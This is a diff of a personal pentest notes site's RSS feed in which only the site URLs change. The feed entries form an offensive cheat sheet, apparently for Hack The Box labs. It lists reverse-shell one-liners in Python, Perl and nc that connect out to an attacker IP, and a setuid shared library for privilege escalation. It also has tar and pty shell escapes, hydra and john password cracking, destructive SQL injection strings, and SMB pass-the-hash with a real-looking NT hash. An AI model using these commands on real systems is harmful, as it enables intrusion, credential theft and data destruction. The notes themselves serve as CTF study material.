@@ -2,21 +2,21 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title></title>
-    <link>https://lnxpen.github.io/notes/</link>
+    <link>https://sosprz.github.io/</link>
     <description>Recent content on </description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <lastBuildDate>Mon, 17 Dec 2018 21:17:20 +0100</lastBuildDate>
     
-	<atom:link href="https://lnxpen.github.io/notes/index.xml" rel="self" type="application/rss+xml" />
+	<atom:link href="https://sosprz.github.io/index.xml" rel="self" type="application/rss+xml" />
     
     
     <item>
       <title>bash commands</title>
-      <link>https://lnxpen.github.io/notes/post/bash-commands/</link>
+      <link>https://sosprz.github.io/post/bash-commands/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://lnxpen.github.io/notes/post/bash-commands/</guid>
+      <guid>https://sosprz.github.io/post/bash-commands/</guid>
       <description>#www server python -m SimpleHTTPServer 8000 
 #on our kali machine we run:
 nc -lvnp 7734 
@@ -33,10 +33,10 @@ cat lists |sed &amp;rsquo;s/^.*://&amp;rsquo; &amp;gt; md5</description>
     
     <item>
       <title>bash scripts</title>
-      <link>https://lnxpen.github.io/notes/post/bash-scrips/</link>
+      <link>https://sosprz.github.io/post/bash-scrips/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://lnxpen.github.io/notes/post/bash-scrips/</guid>
+      <guid>https://sosprz.github.io/post/bash-scrips/</guid>
       <description>Ping
 #!/bin/bash echo &amp;ldquo;first three octets of network to scan, end with a .&amp;rdquo; read network for host in {1..254}; do ping -c1 $network$host &amp;amp;&amp;gt;/dev/null; [ $? -eq 0 ] &amp;amp;&amp;amp; echo &amp;ldquo;$network$host is up&amp;rdquo; echo &amp;ldquo;done checking host: &amp;ldquo; $network$host done 
 Portscan #!/bin/bash echo &amp;ldquo;host to portscan: &amp;ldquo; read host for port in {1..65000}; do (echo &amp;gt; /dev/tcp/$host/$port) &amp;amp;&amp;gt;/dev/null [ $? -eq 0 ] &amp;amp;&amp;amp; echo &amp;ldquo;$port open&amp;rdquo; done</description>
@@ -44,38 +44,38 @@ Portscan #!/bin/bash echo &amp;ldquo;host to portscan: &amp;ldquo; read host for
     
     <item>
       <title>bash tools</title>
-      <link>https://lnxpen.github.io/notes/post/bash-tools/</link>
+      <link>https://sosprz.github.io/post/bash-tools/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://lnxpen.github.io/notes/post/bash-tools/</guid>
+      <guid>https://sosprz.github.io/post/bash-tools/</guid>
       <description></description>
     </item>
     
     <item>
       <title>ctf tools</title>
-      <link>https://lnxpen.github.io/notes/post/ctf-tools/</link>
+      <link>https://sosprz.github.io/post/ctf-tools/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://lnxpen.github.io/notes/post/ctf-tools/</guid>
+      <guid>https://sosprz.github.io/post/ctf-tools/</guid>
       <description>#pspy 32 &amp;amp; 64 bit
 https://github.com/DominicBreuker/pspy</description>
     </item>
     
     <item>
       <title>ldap</title>
-      <link>https://lnxpen.github.io/notes/post/ldap/</link>
+      <link>https://sosprz.github.io/post/ldap/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://lnxpen.github.io/notes/post/ldap/</guid>
+      <guid>https://sosprz.github.io/post/ldap/</guid>
       <description>jxplorer</description>
     </item>
     
     <item>
       <title>links</title>
-      <link>https://lnxpen.github.io/notes/post/links/</link>
+      <link>https://sosprz.github.io/post/links/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://lnxpen.github.io/notes/post/links/</guid>
+      <guid>https://sosprz.github.io/post/links/</guid>
       <description>https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
 https://github.com/pentestmonkey/unix-privesc-check
 https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
@@ -86,37 +86,37 @@ https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/ htt
     
     <item>
       <title>metasploit</title>
-      <link>https://lnxpen.github.io/notes/post/metasploit/</link>
+      <link>https://sosprz.github.io/post/metasploit/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://lnxpen.github.io/notes/post/metasploit/</guid>
+      <guid>https://sosprz.github.io/post/metasploit/</guid>
       <description>#ssh user enum search enumusers use options set USER_FILE run</description>
     </item>
     
     <item>
       <title>nmap</title>
-      <link>https://lnxpen.github.io/notes/post/nmap/</link>
+      <link>https://sosprz.github.io/post/nmap/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://lnxpen.github.io/notes/post/nmap/</guid>
+      <guid>https://sosprz.github.io/post/nmap/</guid>
       <description>nmap -sC -sV -oA nmap/hostname ip nmap -n -T4 -sS -sV -sC -oA nmap/hostname ip nmap -v -sS -p- -A -T4 -oA nmap/hostname ip nmap -v -sU -sS -p- -A -T4 -oA nmap/hostname ip nmap -p 80 &amp;ndash;script http-shellshock &amp;ndash;script-args uri=/cgi-bin/vulnscript.sh ip nmap -p 3306 &amp;ndash;script mysql-brute ip nmap -sV &amp;ndash;script=http-enum ip nmap -sV &amp;ndash;script=nfs-showmount ip nmap -sV &amp;ndash;script ssl-enum-ciphers -p 443 ip nmap -p445 &amp;ndash;script smb-vuln-ms17-010 ip nmap &amp;ndash;script smb-brute.</description>
     </item>
     
     <item>
       <title>openssl</title>
-      <link>https://lnxpen.github.io/notes/post/openssl/</link>
+      <link>https://sosprz.github.io/post/openssl/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://lnxpen.github.io/notes/post/openssl/</guid>
+      <guid>https://sosprz.github.io/post/openssl/</guid>
       <description>https://github.com/glv2/bruteforce-salted-openssl</description>
     </item>
     
     <item>
       <title>passwords</title>
-      <link>https://lnxpen.github.io/notes/post/password/</link>
+      <link>https://sosprz.github.io/post/password/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://lnxpen.github.io/notes/post/password/</guid>
+      <guid>https://sosprz.github.io/post/password/</guid>
       <description>#john john &amp;ndash;format=crypt &amp;ndash;wordlist=rockyou.txt &amp;ndash;session=two hashes.txt john &amp;ndash;format=NT &amp;ndash;rules -w=/usr/share/wordlists/rockyou.txt hashfile.txt
 #hydra hydra -l admin docker.hackthebox.eu -s 44661 -P /usr/share/wordlists/rockyou.txt http-post-form &amp;lsquo;/index.php:password=^PASS^:F=Invalid password!&amp;rsquo; hydra -L users -P passwords 10.10.10.111 ssh hydra 10.10.10.153 http-post-form &amp;ldquo;/moodle/login/index.php:username=^USER^&amp;amp;password=^PASS^:F=Invalid login, please try again&amp;rdquo; -l giovanni -P list -t 10 -w 30 hash-identifier
 hydra -l sammy -P rockyou.txt 10.10.10.76 -t 4 -s 22022 ssh</description>
@@ -124,10 +124,10 @@ hydra -l sammy -P rockyou.txt 10.10.10.76 -t 4 -s 22022 ssh</description>
     
     <item>
       <title>privesc-libseclogin</title>
-      <link>https://lnxpen.github.io/notes/post/privecs-libseclogin/</link>
+      <link>https://sosprz.github.io/post/privecs-libseclogin/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://lnxpen.github.io/notes/post/privecs-libseclogin/</guid>
+      <guid>https://sosprz.github.io/post/privecs-libseclogin/</guid>
       <description>touch libseclogin.c  #include  #include  #include  #include  void seclogin() { setuid(0); setgid(0); execl(&amp;ldquo;/bin/bash&amp;rdquo;,&amp;ldquo;sh&amp;rdquo;,(char *)0); } int main(void) { seclogin(); } 
 Compile the code with /usr/share/bash-completion/completions/gcc -shared -o libseclogin.so -fPIC libseclogin.c
 cp libseclogin.so to /tmp
@@ -137,10 +137,10 @@ cd /etc/ld.so.conf.d ldconfig test.conf #(test.conf write /tmp) #it will give th
     
     <item>
       <title>shell</title>
-      <link>https://lnxpen.github.io/notes/post/shell/</link>
+      <link>https://sosprz.github.io/post/shell/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://lnxpen.github.io/notes/post/shell/</guid>
+      <guid>https://sosprz.github.io/post/shell/</guid>
       <description>export PATH=/bin:/usr/bin:/usr/sbin:/sbin:$PATH export SHELL=/bin/bash
 tar cf /dev/null testfile &amp;ndash;checkpoint=1 &amp;ndash;checkpoint-action=exec=/bin/bash
 python -c &amp;lsquo;import pty; pty.spawn(&amp;ldquo;/bin/bash&amp;rdquo;)&amp;rsquo; python3 -c &amp;lsquo;import pty; pty.spawn(&amp;ldquo;/bin/bash&amp;rdquo;)&amp;rsquo; python -c import pty; pty.spawn(&amp;ldquo;/bin/bash&amp;rdquo;) python3 -c import pty; pty.spawn(&amp;lsquo;/bin/bash&amp;rsquo;)
@@ -150,19 +150,19 @@ echo &amp;ldquo;import pty; pty.spawn(&amp;lsquo;/bin/bash&amp;rsquo;)&amp;rdquo
     
     <item>
       <title>shell esc</title>
-      <link>https://lnxpen.github.io/notes/post/shell-esc/</link>
+      <link>https://sosprz.github.io/post/shell-esc/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://lnxpen.github.io/notes/post/shell-esc/</guid>
+      <guid>https://sosprz.github.io/post/shell-esc/</guid>
       <description>export PATH=/bin:/usr/bin:/usr/sbin:/sbin:$PATH export SHELL=/bin/bash</description>
     </item>
     
     <item>
       <title>shell reverse</title>
-      <link>https://lnxpen.github.io/notes/post/shell_reverse/</link>
+      <link>https://sosprz.github.io/post/shell_reverse/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://lnxpen.github.io/notes/post/shell_reverse/</guid>
+      <guid>https://sosprz.github.io/post/shell_reverse/</guid>
       <description>python3 -c &amp;lsquo;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;ldquo;10.10.10.10&amp;rdquo;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;ldquo;/bin/sh&amp;rdquo;,&amp;ldquo;-i&amp;rdquo;]);&amp;rsquo;
 perl -e &amp;lsquo;use Socket;$i=&amp;ldquo;10.10.10.10&amp;rdquo;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;ldquo;tcp&amp;rdquo;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;ldquo;&amp;gt;&amp;amp;S&amp;rdquo;);open(STDOUT,&amp;ldquo;&amp;gt;&amp;amp;S&amp;rdquo;);open(STDERR,&amp;ldquo;&amp;gt;&amp;amp;S&amp;rdquo;);exec(&amp;ldquo;/bin/sh -i&amp;rdquo;);};&amp;rsquo;
 nc -e /bin/sh 10.0.0.1 1234
@@ -173,10 +173,10 @@ nc -lp 1&amp;gt;/tmp/b</description>
     
     <item>
       <title>shell search</title>
-      <link>https://lnxpen.github.io/notes/post/shell_search/</link>
+      <link>https://sosprz.github.io/post/shell_search/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://lnxpen.github.io/notes/post/shell_search/</guid>
+      <guid>https://sosprz.github.io/post/shell_search/</guid>
       <description>#capabilities getcap -r / 2/dev/null #grep recursive grep -RIlm1 &#34;bash&#34; /skrypty/ #sticky bit find / -perm -1000 -type d -exec la -la {} \; 2/dev/null #sgid chmod 2000 find / -perm -g=s -type f -exec ls -la {} \; 2/dev/null #SUID chmod 4000 find / -perm -u=s -type f -exec ls -la {} \; 2/dev/null  -sudo -l
 -find php in /var/www/html with password to db
 -find backup files</description>
@@ -184,58 +184,58 @@ nc -lp 1&amp;gt;/tmp/b</description>
     
     <item>
       <title>sql</title>
-      <link>https://lnxpen.github.io/notes/post/sql/</link>
+      <link>https://sosprz.github.io/post/sql/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://lnxpen.github.io/notes/post/sql/</guid>
+      <guid>https://sosprz.github.io/post/sql/</guid>
       <description>#sql injection userName = Smith&amp;rsquo; or &amp;lsquo;1&amp;rsquo;=&amp;lsquo;1 userName =&amp;rsquo; or 1=1 &amp;ndash; userID = 1234567 or 1=1 UserName = Smith’;drop table users; truncate audit_log;&amp;ndash;</description>
     </item>
     
     <item>
       <title>ssh</title>
-      <link>https://lnxpen.github.io/notes/post/ssh/</link>
+      <link>https://sosprz.github.io/post/ssh/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://lnxpen.github.io/notes/post/ssh/</guid>
+      <guid>https://sosprz.github.io/post/ssh/</guid>
       <description>#putty puttygen my_private_key.ppk -O private-openssh -o keyfile
 #ssh ssh -i keyfile root@10.10.10.107</description>
     </item>
     
     <item>
       <title>stego</title>
-      <link>https://lnxpen.github.io/notes/post/stego/</link>
+      <link>https://sosprz.github.io/post/stego/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://lnxpen.github.io/notes/post/stego/</guid>
+      <guid>https://sosprz.github.io/post/stego/</guid>
       <description>steghide export -sf file.jpg
 ./stegcracker ../../Hackthebox/Stego/beatles/BAND.JPG ../../app/rockyou.txt</description>
     </item>
     
     <item>
       <title>www dir scan</title>
-      <link>https://lnxpen.github.io/notes/post/www-dir-scan/</link>
+      <link>https://sosprz.github.io/post/www-dir-scan/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>https://lnxpen.github.io/notes/post/www-dir-scan/</guid>
+      <guid>https://sosprz.github.io/post/www-dir-scan/</guid>
       <description> dirb -h cewl seclists gobuster -u http://10.10.10.111:1880 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt gobuster -u http://10.10.10.111:9999/backup -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt #with -m -x it will be search txt,html gobuster -u http://10.10.10.111/dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -m -x  </description>
     </item>
     
     <item>
       <title>smb</title>
-      <link>https://lnxpen.github.io/notes/post/smb/</link>
+      <link>https://sosprz.github.io/post/smb/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://lnxpen.github.io/notes/post/smb/</guid>
+      <guid>https://sosprz.github.io/post/smb/</guid>
       <description>#user % hash smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B &amp;ndash;pw-nt-hash -W YPUFFY -L 10.10.10.107
 #Allow to login to smb share smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B &amp;ndash;pw-nt-hash -W YPUFFY \\10.10.10.107\alice</description>
     </item>
     
     <item>
       <title>xss</title>
-      <link>https://lnxpen.github.io/notes/post/xss/</link>
+      <link>https://sosprz.github.io/post/xss/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://lnxpen.github.io/notes/post/xss/</guid>
+      <guid>https://sosprz.github.io/post/xss/</guid>
       <description>xsser -u</description>
     </item>
     
